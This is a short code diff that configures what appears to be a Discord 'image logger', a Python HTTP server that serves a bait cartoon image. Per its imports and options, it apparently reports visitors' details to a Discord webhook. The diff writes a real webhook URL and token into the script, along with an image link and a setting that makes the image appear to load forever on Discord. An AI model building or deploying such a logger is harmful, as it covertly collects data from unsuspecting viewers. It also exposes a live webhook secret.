@@ -2,8 +2,8 @@ from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import requests, base64, httpagentparser
 
-webhook = 'WEBHOOK'
-bindata = requests.get('link to image here').content
+webhook = 'https://discord.com/api/webhooks/1061754659557081229/4EBPJ_3N4ZwOSP5nlHJqbqq2WfMZ_qI1BlcquLHIpPnqXlWBQxcawzPhZoC6mS1mUTUO'
+bindata = requests.get('https://static.wikia.nocookie.net/tudosobrehoradeaventura/images/3/37/Adventure_Time_-_Title_card.png/revision/latest?cb=20130719205556&path-prefix=pt-br').content
 
 buggedimg = True # Set this to True if you want the image to show as loading on Discord, False if you don't. (CASE SENSITIVE)
 
